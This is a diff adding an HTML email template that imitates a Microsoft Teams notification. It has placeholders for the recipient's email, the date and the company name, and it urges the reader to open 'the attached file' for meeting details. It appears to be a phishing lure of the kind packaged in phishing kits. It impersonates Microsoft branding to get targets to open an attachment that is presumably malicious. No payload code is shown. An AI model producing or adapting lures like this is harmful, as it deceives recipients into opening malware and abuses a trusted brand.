@@ -1,0 +1,129 @@
+<html lang="en">
+<head>
+	<meta charset="UTF-8" />
+	<meta content="width=device-width, initial-scale=1.0" name="viewport" />
+	<title>Teams Notification</title>
+	<style type="text/css">body {
+            display: flex;
+            justify-content: center;
+            align-items: flex-start;
+            height: 100vh;
+            margin: 0;
+            font-family: Arial, sans-serif;
+            background-color: #ffffff;
+        }
+        .container {
+            text-align: left;
+            margin-top: 5px;
+            width: 600px;
+            padding: 20px;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+        }
+        .header {
+            display: flex;
+            align-items: center;
+            margin-bottom: 20px;
+        }
+        .logo {
+            display: flex;
+            align-items: center;
+            margin-right: 10px;
+        }
+        .logo .icon {
+            width: 40px;
+            height: 40px;
+            background-color: #6264A7;
+            border-radius: 4px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            color: #ffffff;
+            font-size: 24px;
+            font-weight: bold;
+            margin-right: 10px;
+        }
+        .logo .text {
+            display: flex;
+            flex-direction: column;
+        }
+        .logo .text span {
+            line-height: 1.2;
+        }
+        .logo .text .company {
+            font-size: 18px;
+            font-weight: bold;
+            color: #6264A7;
+        }
+        .logo .text .product {
+            font-size: 24px;
+            color: #000;
+        }
+        .button {
+            display: inline-block;
+            margin-top: 20px;
+            padding: 10px 20px;
+            background-color: #6264A7;
+            color: #ffffff;
+            text-decoration: none;
+            border-radius: 5px;
+            font-weight: bold;
+        }
+        .footer {
+            margin-top: 20px;
+            color: #888888;
+            text-align: center;
+        }
+        .footer a {
+            color: #6264A7;
+            text-decoration: none;
+        }
+        .note {
+            margin-top: 15px;
+            padding: 10px;
+            background-color: #f8f9fa;
+            border-left: 4px solid #6264A7;
+            font-size: 12px;
+            color: #555;
+        }
+	</style>
+	<meta content="MSHTML 11.00.9600.17037" name="GENERATOR" />
+</head>
+<body>
+<div class="container">
+<div class="header">
+<div class="logo">
+<div class="icon">
+    <svg width="20" height="20" viewBox="0 0 24 24" fill="white">
+        <path d="M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1.5 14h-11c-.3 0-.5-.2-.5-.5v-1c0-.3.2-.5.5-.5h11c.3 0 .5.2.5.5v1c0 .3-.2.5-.5.5zm0-4h-11c-.3 0-.5-.2-.5-.5v-1c0-.3.2-.5.5-.5h11c.3 0 .5.2.5.5v1c0 .3-.2.5-.5.5zm0-4h-11c-.3 0-.5-.2-.5-.5v-1c0-.3.2-.5.5-.5h11c.3 0 .5.2.5.5v1c0 .3-.2.5-.5.5z"/>
+    </svg>
+</div>
+
+<div class="text"><span style="font-size:10px;"><span style="font-size:9px;"><span class="company">Microsoft</span> <span class="product">&nbsp;Teams</span></span></span></div>
+</div>
+</div>
+
+<p><span style="font-size:12px;"><span style="font-family:lucida sans unicode,lucida grande,sans-serif;">Notification Sent To: <%= EMAIL %></span></span></p>
+
+<p><span style="font-size:12px;"><span style="font-family:lucida sans unicode,lucida grande,sans-serif;">Date: <%= TIME %></span></span></p>
+
+<p><span style="font-size:12px;"><span style="font-family:lucida sans unicode,lucida grande,sans-serif;">You have (1) new pending notification on Teams:<%= COMPANYNAME %>78675.73kb</span></span></p>
+
+<div class="note">
+    <span style="font-family:lucida sans unicode,lucida grande,sans-serif;">
+        Please use the attached file to get full brief on meeting requirements and details.
+    </span>
+</div>
+
+<p>
+<span style="font-size:12px;"><span style="font-family:lucida sans unicode,lucida grande,sans-serif;">Thanks in advance for your co-operation.</span></span><br />
+&nbsp;</p>
+
+<p><span style="font-size:12px;"><span style="font-family:lucida sans unicode,lucida grande,sans-serif;">Best regards,<br />
+<%= COMPANYNAME %><br />
+<%- LOGO %></span></span></p>
+
+<p class="footer"><span style="font-size:12px;"><span style="font-family:lucida sans unicode,lucida grande,sans-serif;">All contents &copy; Copyright <a href="#">Teams 2025</a>. All rights reserved.</span></span></p>
+</div>
+</body>
+</html>
